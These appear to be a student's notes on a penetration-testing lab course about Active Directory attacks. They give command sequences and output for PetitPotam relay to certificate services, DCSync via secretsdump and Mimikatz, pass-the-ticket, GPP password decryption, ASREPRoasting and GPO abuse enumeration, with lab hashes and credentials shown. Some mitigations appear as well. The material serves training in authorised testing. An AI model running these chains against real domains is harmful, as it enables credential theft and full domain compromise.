+	> Running PetitPotam.py
+		m1l0js@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
+                                                                                 
+
+	> Catching Base64 Encoded Certificate for DC01
+	> Back in our other window, we will see a successful login request and obtain the base64 encoded certificate for the Domain Controller if the attack is successful.
+	> Catching Base64 Encoded Certificate for DC01
+		m1l0js@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+
+	> Requesting a TGT Using gettgtpkinit.py
+	> Next, we can take this base64 certificate and use gettgtpkinit.py to request a Ticket-Granting-Ticket (TGT) for the domain controller.
+	> Requesting a TGT Using gettgtpkinit.py
+m1l0js@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEAMIIIhQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQItd0rgWuhmI0CAggAgIIIWAvQEknxhpJWLyXiVGcJcDVCquWE6Ixzn86jywWY4HdhG624zmBgJKXB6OVV9bRODMejBhEoLQQ+jMVNrNoj3wxg6 [SNIP]Gmy= dc01.ccache
+
+	> Setting the KRB5CCNAME Environment Variable
+	> The TGT requested above was saved down to the dc01.ccache file, which we use to set the KRB5CCNAME environment variable, so our attack host uses this file for Kerberos authentication attempts.
+	> Setting the KRB5CCNAME Environment Variable
+		m1l0js@htb[/htb]$ export KRB5CCNAME=dc01.ccache
+
+	> Using Domain Controller TGT to DCSync
+	> We can then use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.
+	> Using Domain Controller TGT to DCSync
+		m1l0js@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+
+	> We could also use a more straightforward command: secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL because the tool will retrieve the username from the ccache file. We can see this by typing klist (using the klist command requires installation of the krb5-user package on our attack host. This is installed on ATTACK01 in the lab already).
+	> Running klist
+		m1l0js@htb[/htb]$ klist
+		
+		Ticket cache: FILE:dc01.ccache
+		Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL
+		
+		Valid starting       Expires              Service principal
+		04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
+
+	> Confirming Admin Access to the Domain Controller
+	> Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller. From here, we have complete control over the domain and could look to establish persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust relationships.
+	> Confirming Admin Access to the Domain Controller
+		m1l0js@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
+
+	> Submitting a TGS Request for Ourselves Using getnthash.py
+	> We can also take an alternate route once we have the TGT for our target. Using the tool getnthash.py from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate (PAC => https://stealthbits.com/blog/what-is-the-kerberos-pac/)  which contains the NT hash for the target. This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.
+	> Submitting a TGS Request for Ourselves Using getnthash.py
+		m1l0js@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
+			[*] Using TGT from cache
+			[*] Requesting ticket to self with PAC
+			Recovered NT Hash
+			313b6f423cd1ee07e91315b4919fb4ba
+
+	> We can then use this hash to perform a DCSync with secretsdump.py using the -hashes flag.
+	> Using Domain Controller NTLM Hash to DCSync
+		m1l0js@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
+
+	> Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.
+	> Note: We would need to use the MS01 attack host in another section, such as the ACL Abuse Tactics or Privileged Access section once we have the base64 certificate saved down to our notes to perform this using Rubeus.
+	> Requesting TGT and Performing PTT with DC01$ Machine Account
+		PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzCCEn8GCSqGSIb3DQEHAaCCEnAEghJsMIISaDCCCJ8GCSqGSIb3DQEHBqCCCJAwggiMAgEAMIIIhQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQI/4gr5ojclZ0CAggAgIIIWEbNG5AHeeAIBHlVEokmojeGyuSqGImFR[SNIP]Ry4= /ptt
+
+	> We can then type klist to confirm that the ticket is in memory.
+	> Confirming the Ticket is in Memory
+		PS C:\Tools> klist
+		Current LogonId is 0:0x4e56b
+		
+		Cached Tickets: (3)
+		
+		#0>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
+		        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+		        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+		        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+		        Start Time: 3/30/2022 15:53:09 (local)
+		        End Time:   3/31/2022 1:50:25 (local)
+		        Renew Time: 4/6/2022 15:50:25 (local)
+		        Session Key Type: RSADSI RC4-HMAC(NT)
+		        Cache Flags: 0x2 -> DELEGATION
+		        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+		
+		#1>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
+		        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+		        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+		        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+		        Start Time: 3/30/2022 15:50:25 (local)
+		        End Time:   3/31/2022 1:50:25 (local)
+		        Renew Time: 4/6/2022 15:50:25 (local)
+		        Session Key Type: RSADSI RC4-HMAC(NT)
+		        Cache Flags: 0x1 -> PRIMARY
+		        Kdc Called:
+		
+		#2>     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
+		        Server: cifs/academy-ea-dc01 @ INLANEFREIGHT.LOCAL
+		        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+		        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+		        Start Time: 3/30/2022 15:53:09 (local)
+		        End Time:   3/31/2022 1:50:25 (local)
+		        Renew Time: 4/6/2022 15:50:25 (local)
+		        Session Key Type: RSADSI RC4-HMAC(NT)
+		        Cache Flags: 0
+		        Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+
+	> Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host. Here, we grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and establish persistence. We could obtain the NT hash for any privileged user using DCSync and move forward to the next phase of our assessment.
+	> Performing DCSync with Mimikatz
+		PS C:\Tools> cd .\mimikatz\x64\
+		PS C:\Tools\mimikatz\x64> .\mimikatz.exe
+		mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
+
+* PetitPotam Mitigations
+	> First off, the patch for CVE-2021-36942 should be applied to any affected hosts. Below are some further hardening steps that can be taken:
+
+    		- To prevent NTLM relay attacks, use Extended Protection for Authentication(https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling Require SSL(https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
+    		- Disabling NTLM authentication(https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
+    		- Disabling NTLM on AD CS servers using Group Policy(https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
+    		- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use
+
+	> For more reading on attacking Active Directory Certificate Services, I highly recommend the whitepaper Certified Pre-Owned(https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) as this demonstrates attacks against AD CS that can be performed using authenticated API calls. This shows that just applying the CVE-2021-36942 patch alone to mitigate PetitPotam is not enough for most organizations running AD CS, because an attacker with standard domain user credentials can still perform attacks against AD CS in many instances. The whitepaper also details other hardening and detection steps that can be taken to harden AD CS.
+Recap
+
+
+* In this section we covered three recent attacks:
+
+    	- NoPac (SamAccountName Spoofing)
+    	- PrintNightmare (remotely)
+    	- PetitPotam (MS-EFSRPC)
+
+	> Each of these attacks can be performed with either standard domain user access (NoPac) or without any type of authentication to the domain at all (PrintNightmare and PetitPotam), and can lead to domain compromise relatively easily. There are multiple ways to perform each attack, and we covered a few. Active Directory attacks continue to evolve, and these are surely not the last extremely high-impact attack vectors that we will see. When these types of attacks are released, we should strive to build a small lab environment to practice them in, so we are ready to use them safely and effectively in a real-world engagement should the opportunity arise. Understanding how to set up these attacks in a lab can also significantly increase our understanding of the issue and help us to better advise our clients on the impact, remediation, and detections. This was just a tiny glimpse into the world of attacking AD CS, which could be an entire module.
+
+	> In the next section, we'll talk through various other issues that we see from time to time in Active Directory environments that could help us further our access or lead to additional findings for our final client report.
+
+-=-=-=
+[+] Miscellaneous Misconfigurations
+	> There are many other attacks and interesting misconfigurations that we may come across during an assessment. A broad understanding of the ins and outs of AD will help us think outside the box and discover issues that others are likely to miss.
+
+* Scenario Setup
+	> In this section, we will move back and forth between a Windows and Linux attack host as we work through the various examples. You can spawn the hosts for this section at the end of this section and RDP into the MS01 Windows attack host. For the portions of this section that require interaction from a Linux host, you can open a PowerShell console on MS01 and SSH to 172.16.5.225 with the credentials htb-student:HTB_@cademy_stdnt!.
+
+* Exchange Related Group Membership
+	> A default installation of Microsoft Exchange within an AD environment (with no split-administration model) opens up many attack vectors, as Exchange is often granted considerable privileges within the domain (via users, groups, and ACLs). The group Exchange Windows Permissions is not listed as a protected group, but members are granted the ability to write a DACL to the domain object. This can be leveraged to give a user DCSync privileges. An attacker can add accounts to this group by leveraging a DACL misconfiguration (possible) or by leveraging a compromised account that is a member of the Account Operators group. It is common to find user accounts and even computers as members of this group. Power users and support staff in remote offices are often added to this group, allowing them to reset passwords. This GitHub repo(https://github.com/gdedrouas/Exchange-AD-Privesc) details a few techniques for leveraging Exchange for escalating privileges in an AD environment.
+	> The Exchange group Organization Management is another extremely powerful group (effectively the "Domain Admins" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called Microsoft Exchange Security Groups, which contains the group Exchange Windows Permissions.
+	> If we can compromise an Exchange server, this will often lead to Domain Admin privileges. Additionally, dumping credentials in memory from an Exchange server will produce 10s if not 100s of cleartext credentials or NTLM hashes. This is often due to users logging in to Outlook Web Access (OWA) and Exchange caching their credentials in memory after a successful login.
+
+* PrivExchange
+	> The PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.
+	> The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.
+
+* Printer Bug
+	> The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool's named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method, and force the server to authenticate to any host provided by the client over SMB.
+	> The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.
+	> The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim's computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.
+
+	> We can use tools such as the Get-SpoolStatus module from this(https://github.com/cube0x0/Security-Assessment) tool to check for machines vulnerable to the MS-PRN Printer Bug. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.
+	> Enumerating for MS-PRN Printer Bug
+		PS C:\htb> Import-Module .\SecurityAssessment.ps1
+		PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+		ComputerName                        Status
+		------------                        ------
+		ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
+
+* MS14-068
+	> This was a flaw in the Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. A Kerberos ticket contains information about a user, including the account name, ID, and group membership in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to validate that the PAC has not been tampered with after creation.
+	> The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate. This can be leveraged to create a fake PAC, presenting a user as a member of the Domain Administrators or other privileged group. It can be exploited with tools such as the Python Kerberos Exploitation Kit (PyKEK => https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit. The only defense against this attack is patching. The machine Mantis on the Hack The Box platform showcases this vulnerability.
+
+* Sniffing LDAP Credentials
+
+	> Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with weak or default passwords. Sometimes, these credentials can be viewed in cleartext. Other times, the application has a test connection function that we can use to gather credentials by changing the LDAP IP address to that of our attack host and setting up a netcat listener on LDAP port 389. When the device attempts to test the LDAP connection, it will send the credentials to our machine, often in cleartext. Accounts used for LDAP connections are often privileged, but if not, this could serve as an initial foothold in the domain. Other times, a full LDAP server is required to pull off this attack, as detailed in this post => (https://grimhacker.com/2018/03/09/just-a-printer/)
+
+* Enumerating DNS Records
+
+	> We can use a tool such as adidnsdump(https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account. This is especially helpful if the naming convention for hosts returned to us in our enumeration using tools such as BloodHound is similar to SRV01934.INLANEFREIGHT.LOCAL. If all servers and workstations have a non-descriptive name, it makes it difficult for us to know what exactly to attack. If we can access DNS entries in AD, we can potentially discover interesting DNS records that point to this same server, such as JENKINS.INLANEFREIGHT.LOCAL, which we can use to better plan out our attacks.
+The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment. By default, querying DNS records using LDAP does not return all results. So by using the adidnsdump tool, we can resolve all records in the zone and potentially find something useful for our engagement. The background and more in-depth explanation of this tool and technique can be found in this post => (https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
+
+	> On the first run of the tool, we can see that some records are blank, namely ?,LOGISTICS,?.
+	> Using adidnsdump
+		m1l0js@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
+	> Viewing the Contents of the records.csv File
+		m1l0js@htb[/htb]$ head records.csv 
+	> If we run again with the -r flag the tool will attempt to resolve unknown records by performing an A query. Now we can see that an IP address of 172.16.5.240 showed up for LOGISTICS. While this is a small example, it is worth running this tool in larger environments. We may uncover "hidden" records that can lead to discovering interesting hosts.
+	> Using the -r Option to Resolve Unknown Records
+		m1l0js@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
+
+* Other Misconfigurations
+	> There are many other misconfigurations that can be used to further your access within a domain.
+
+* Password in Description Field
+	> To import activedirectory module ==> Install-WindowsFeature RSAT-AD-PowerShell
+	> Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.
+	> Finding Passwords in the Description Field using Get-Domain User
+		PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
+
+* PASSWD_NOTREQD Field
+	> It is possible to come across domain accounts with the passwd_notreqd(https://ldapwiki.com/wiki/PASSWD_NOTREQD) field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don’t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn't mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.
+	> Checking for PASSWD_NOTREQD Setting using Get-DomainUser
+		PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
+* Credentials in SMB Shares and SYSVOL Scripts
+	> The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named reset_local_admin_pass.vbs.
+	> Discovering an Interesting Script
+		PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+		Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+		Mode                LastWriteTime         Length Name                                                                 
+		----                -------------         ------ ----                                                                 
+		-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
+		-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
+		-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
+		-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs  
+
+	> Taking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts. In this case, it would be worth checking to see if this password is still set on any hosts in the domain. We could do this using CrackMapExec and the --local-auth flag.
+
+* Group Policy Preferences (GPP) Passwords
+	> When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:
+    		- Map drives (drives.xml)
+    		- Create local users
+    		- Create printer config files (printers.xml)
+    		- Creating and updating services (services.xml)
+    		- Creating scheduled tasks (scheduledtasks.xml)
+    		- Changing local admin passwords.
+
+	> These files can contain an array of configuration data and defined passwords. The cpassword attribute value is AES-256 bit encrypted, but Microsoft published the AES private key(https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.
+	> This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege(https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30), to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.
+	> The XML looks like the following:
+	> Viewing Groups.xml => (https://academy.hackthebox.com/storage/modules/143/GPP.png)
+	> If you retrieve the cpassword value more manually, the gpp-decrypt utility can be used to decrypt the password as follows:
+	> Decrypting the Password with gpp-decrypt
+		m1l0js@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+
+	> GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as Get-GPPPassword.ps1(https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1), the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.
+	> Locating & Retrieving GPP Passwords with CrackMapExec
+		m1l0js@htb[/htb]$ crackmapexec smb -L | grep gpp
+
+	> It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy. This may be set up for any number of reasons for a machine to automatically log in at boot. If this is set via Group Policy and not locally on the host, then anyone on the domain can retrieve credentials stored in the Registry.xml file created for this purpose. This is a separate issue from GPP passwords as Microsoft has not taken any action to block storing these credentials on the SYSVOL in cleartext and, hence, are readable by any authenticated user in the domain. We can hunt for this using CrackMapExec with the gpp_autologin(https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-gpp_autologin) module, or using the Get-GPPAutologon.ps1(https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) script included in PowerSploit.
+	> Using CrackMapExec's gpp_autologin Module
+		m1l0js@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+
+	> In the output above, we can see that we have retrieved the credentials for an account called guarddesk. This may have been set up so that shared workstations used by guards automatically log in at boot to accommodate multiple users throughout the day and night working different shifts. In this case, the credentials are likely a local admin, so it would be worth finding hosts where we can log in as an admin and hunt for additional data. Sometimes we may discover credentials for a highly privileged user or credentials for a disabled account/an expired password that is no use to us.
+	> A theme that we touch on throughout this module is password re-use. Poor password hygiene is common in many organizations, so whenever we obtain credentials, we should check to see if we can use them to access other hosts (as a domain or local user), leverage any rights such as interesting ACLs, access shares, or use the password in a password spraying attack to uncover password re-use and maybe an account that grants us further access towards our goal.
+
+* ASREPRoasting
+	> It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.
+	> With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.
+	> ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
+	> The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account's password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.
+	> Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to DONT_REQ_PREAUTH.
+	> Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
+		PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+	> With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the /nowrap flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.
+	> Retrieving AS-REP in Proper Format using Rubeus
+		PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+
+	> We can then crack the hash offline using Hashcat with mode 18200.
+	> Cracking the Hash Offline with Hashcat
+		m1l0js@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
+
+	> When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.
+	> Retrieving the AS-REP Using Kerbrute
+		m1l0js@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+
+	> With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberoast pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as jsmith.txt into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.
+	> Hunting for Users with Kerberoast Pre-auth Not Required
+		m1l0js@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
+
+	> We have now covered a few ways that we can perform an ASREPRoasting attack from both Windows and Linux hosts and witnessed how we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.
+
+* Group Policy Object (GPO) Abuse
+	> Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment. Group Policy, when used right, is an excellent tool for hardening an AD environment by configuring user settings, operating systems, and applications. That being said, Group Policy can also be abused by attackers. If we can gain rights over a Group Policy Object via an ACL misconfiguration, we could leverage this for lateral movement, privilege escalation, and even domain compromise and as a persistence mechanism within the domain. Understanding how to enumerate and attack GPOs can give us a leg up and can sometimes be the ticket to achieving our goal in a rather locked-down environment.
+	> GPO misconfigurations can be abused to perform the following attacks:
+    		- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
+    		- Adding a local admin user to one or more hosts
+    		- Creating an immediate scheduled task to perform any number of actions
+
+	> We can enumerate GPO information using many of the tools we've been using throughout this module such as PowerView and BloodHound. We can also use group3r(https://github.com/Group3r/Group3r), ADRecon(https://github.com/sense-of-security/ADRecon), PingCastle(https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.
+	> Using the Get-DomainGPO function from PowerView, we can get a listing of GPOs by name.
+	> Enumerating GPO Names with PowerView
+		PS C:\htb> Get-DomainGPO |select displayname
+
+	> This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in GroupPolicy cmdlets such as Get-GPO to perform the same enumeration.
+	> Enumerating GPO Names with a Built-In Cmdlet
+		PS C:\htb> Get-GPO -All | Select DisplayName
+
+	> Next, we can check if a user we can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.
+	> Enumerating Domain User GPO Rights
+		PS C:\htb> $sid=Convert-NameToSid "Domain Users"
+		PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+
+			ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+			ObjectSID             :
+			ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
+			                        WriteOwner
+			BinaryLength          : 36
+			AceQualifier          : AccessAllowed
+			IsCallback            : False
+			OpaqueLength          : 0
+			AccessMask            : 983095
+			SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
+			AceType               : AccessAllowed
+			AceFlags              : ObjectInherit, ContainerInherit
+			IsInherited           : False
+			InheritanceFlags      : ContainerInherit, ObjectInherit
+			PropagationFlags      : None
+			AuditFlags            : None
+
+	> Here we can see that the Domain Users group has various permissions over a GPO, such as WriteProperty and WriteDacl, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with Get-GPO to see the display name of the GPO.
+	> Converting GPO GUID to Name
+		PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
+
+			DisplayName      : Disconnect Idle RDP
+			DomainName       : INLANEFREIGHT.LOCAL
+			Owner            : INLANEFREIGHT\Domain Admins
+			Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
+			GpoStatus        : AllSettingsEnabled
+			Description      :
+			CreationTime     : 10/28/2021 3:34:07 PM
+			ModificationTime : 4/5/2022 6:54:25 PM
+			UserVersion      : AD Version: 0, SysVol Version: 0
+			ComputerVersion  : AD Version: 0, SysVol Version: 0
+			WmiFilter        :
+
+	> Checking in BloodHound, we can see that the Domain Users group has several rights over the Disconnect Idle RDP GPO, which could be leveraged for full control of the object. => (https://academy.hackthebox.com/storage/modules/143/gporights.png)
+	> If we select the GPO in BloodHound and scroll down to Affected Objects on the Node Info tab, we can see that this GPO is applied to one OU, which contains four computer objects.
